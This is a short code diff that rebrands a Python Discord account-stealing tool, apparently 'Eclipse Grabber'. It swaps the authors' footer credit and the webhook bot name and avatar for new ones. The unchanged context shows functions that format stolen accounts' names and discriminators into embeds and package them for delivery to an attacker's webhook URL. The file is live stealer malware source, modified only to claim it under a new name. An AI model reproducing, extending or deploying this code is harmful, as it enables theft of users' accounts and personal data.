@@ -158,7 +158,7 @@ def embed_info(accounts: List[Account]) -> List[dict]:
         embeds.append({
             "color": 0x6A5ACD,
             "fields": fields,
-            "footer": {"text": "Made by @3ct0s and @JM1k1"},
+            "footer": {"text": "Made by Kaasklontje#0305"},
             "author": {
                 "name": (
                     f"{account.name}#{account.discriminator} "
@@ -175,8 +175,8 @@ def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Eclipse Grabber",
-        "avatar_url": "https://imgur.com/Ymo8GEe.png"
+        "username": "Uter",
+        "avatar_url": "https://images-ext-1.discordapp.net/external/owoRkwzmsAr-xWuxaOWKMux7NK8S3FeaM30s-2qznHY/https/media.discordapp.net/attachments/952675248208216194/952691370227798056/Uter.png"
     }
 
     data = dumps(webhook).encode()
